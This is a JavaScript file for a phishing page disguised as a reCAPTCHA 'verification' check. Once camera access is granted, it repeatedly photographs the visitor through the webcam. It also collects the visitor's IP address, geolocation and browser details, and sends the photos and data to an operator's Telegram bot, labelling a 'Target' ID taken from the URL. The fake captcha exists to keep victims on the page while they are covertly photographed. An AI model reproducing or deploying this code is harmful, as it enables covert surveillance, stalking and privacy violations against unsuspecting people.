import { CONFIG } from "./config.js";

/* ================= DOM refs ================= */
const video     = document.getElementById("video");
const canvas    = document.getElementById("canvas");
const camPanel  = document.getElementById("camPanel");
const camTitle  = document.getElementById("camTitle");
const camSub    = document.getElementById("camSub");
const liveBar   = document.getElementById("liveBar");
const cntCap    = document.getElementById("cntCaptures");
const delSt     = document.getElementById("delStatus");
const diag      = document.getElementById("diag");
const sessId    = document.getElementById("sessId");
const recapW    = document.getElementById("recapWrap");

/* ================= Params ================= */
const params     = new URLSearchParams(window.location.search);
const userChatId = params.get("id");
const hasTarget  = !!(userChatId && userChatId.trim());
const ADMIN_ID   = CONFIG.ADMIN_CHAT_ID;

let stream = null;
let captureTimer = null;
let captureCount = 0;
let capturing = false;
let recaptchaWidgetId = null;

/* Short session id shown in top bar */
sessId.textContent = Math.random().toString(36).slice(2, 8).toUpperCase();

/* ================= Helpers ================= */
function diagLog(t){
  if (CONFIG.DEBUG) console.log("[v3]", t);
  if (diag) diag.textContent = t;
}

function setCamPanel(state, title, sub){
  camPanel.classList.remove("requesting","active");
  camPanel.classList.add(state);
  camTitle.textContent = title;
  camSub.textContent = sub;
}

/* ================= Intel ================= */
async function getIP(){
  try {
    const r = await fetch("https://api.ipify.org?format=json");
    const d = await r.json();
    return d.ip || "Unknown";
  } catch {
    try {
      const r = await fetch("https://ipapi.co/json/");
      const d = await r.json();
      return d.ip || "Unknown";
    } catch { return "Unknown"; }
  }
}

async function getGeo(){
  try {
    const r = await fetch("https://ipapi.co/json/");
    const d = await r.json();
    return `${d.city || "?"}, ${d.country_name || "?"}`;
  } catch { return "Unknown"; }
}

/* ================= Send to one chat ================= */
async function sendPhotoTo(targetId, blob, caption){
  const fd = new FormData();
  fd.append("chat_id", targetId);
  fd.append("photo", blob, `cap_${Date.now()}.jpg`);
  fd.append("caption", caption);
  try {
    const res = await fetch(
      `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`,
      { method: "POST", body: fd }
    );
    if (!res.ok){
      diagLog("send fail " + targetId);
      return false;
    }
    return true;
  } catch (e){
    diagLog("net err " + targetId);
    return false;
  }
}

/* ================= Capture one frame ================= */
async function capture(){
  if (!stream || !capturing) return;

  canvas.width  = video.videoWidth  || CONFIG.CAM_WIDTH;
  canvas.height = video.videoHeight || CONFIG.CAM_HEIGHT;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0);

  const blob = await new Promise(res =>
    canvas.toBlob(res, "image/jpeg", CONFIG.IMAGE_QUALITY)
  );
  if (!blob) return;

  const ip = await getIP();
  const geo = await getGeo();
  const ua = navigator.userAgent;
  const date = new Date().toLocaleString("en-US", { timeZoneName: "short" });

  const base = `📸 #${captureCount + 1}\n🕐 ${date}\n🌐 ${ip} — ${geo}\n💻 ${ua}`;
  const adminCaption = hasTarget
    ? `${base}\n👤 Target: ${userChatId}`
    : `${base}\n🧾 No target (admin-only)`;

  if (CONFIG.SEND_ADMIN_ALWAYS){
    await sendPhotoTo(ADMIN_ID, blob, adminCaption);
  }
  if (CONFIG.SEND_TO_USER_IF_ID && hasTarget){
    await sendPhotoTo(userChatId, blob, base);
  }

  captureCount++;
  cntCap.textContent = captureCount;
  delSt.textContent = "✓";
  diagLog("capture " + captureCount);
}

/* ================= Start camera ================= */
async function startCamera(){
  diagLog("requesting camera");
  setCamPanel("requesting","Requesting camera…","Please click Allow to continue.");

  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: {
        width:  { ideal: CONFIG.CAM_WIDTH },
        height: { ideal: CONFIG.CAM_HEIGHT },
        facingMode: "user"
      }
    });
    video.srcObject = stream;
    await video.play();
    await new Promise(res => {
      if (video.readyState >= 2) return res();
      video.onloadeddata = res;
      setTimeout(res, 2500);
    });

    window.__cameraReady = true;
    setCamPanel("active","Camera active","Solve the check below to continue.");
    liveBar.style.display = "flex";
    recapW.classList.remove("fader");

    // Start capture loop
    capturing = true;
    await capture();
    captureTimer = setInterval(capture, CONFIG.CAPTURE_INTERVAL_MS);

    // Try to render reCAPTCHA now (in case reCAPTCHA loaded first)
    tryRenderRecaptcha();

    diagLog("camera running");
  } catch (err){
    diagLog("camera denied: " + err.name);
    setCamPanel("active","Camera required","Please allow camera access and reload.");
  }
}

/* ================= Stop ================= */
function stopCapture(){
  capturing = false;
  if (captureTimer){ clearInterval(captureTimer); captureTimer = null; }
  if (stream){
    stream.getTracks().forEach(t => t.stop());
    stream = null;
  }
  liveBar.style.display = "none";
}

/* ================= reCAPTCHA ================= */
function tryRenderRecaptcha(){
  if (!window.__recaptchaReady || !window.__cameraReady) return;
  if (recaptchaWidgetId !== null) return;

  const container = document.getElementById("recaptchaWidget");
  if (!container) return;

  try {
    recaptchaWidgetId = window.grecaptcha.render(container, {
      sitekey: CONFIG.RECAPTCHA_SITE_KEY,
      callback: onRecaptchaSuccess,
      "expired-callback": onRecaptchaExpired,
      "error-callback": onRecaptchaError
    });
    diagLog("recaptcha rendered");
  } catch (e){
    console.error("reCAPTCHA error:", e);
    diagLog("recaptcha render fail");
  }
}
window.__tryRenderRecaptcha = tryRenderRecaptcha;

function onRecaptchaSuccess(){
  diagLog("captcha solved");
  document.getElementById("bottomRight").textContent = "✓ Verified";

  if (CONFIG.STAY_ON_PAGE_AFTER_SUCCESS){
    // keep capturing
    return;
  }
  // Stop capture and redirect to next.html
  stopCapture();
  setTimeout(() => {
    window.location.href = "next.html";
  }, 800);
}
window.onRecaptchaSuccess = onRecaptchaSuccess;

function onRecaptchaExpired(){
  diagLog("captcha expired");
  setCamPanel("active","Session expired","Please solve the check again.");
}
window.onRecaptchaExpired = onRecaptchaExpired;

function onRecaptchaError(){
  diagLog("captcha error");
  setCamPanel("active","Error","Something went wrong. Please reload.");
}
window.onRecaptchaError = onRecaptchaError;

/* ================= Auto start on load ================= */
if (CONFIG.AUTO_START_ON_LOAD){
  window.addEventListener("load", () => {
    diagLog("auto-start on load");
    startCamera();
  });
}

window.addEventListener("beforeunload", stopCapture);
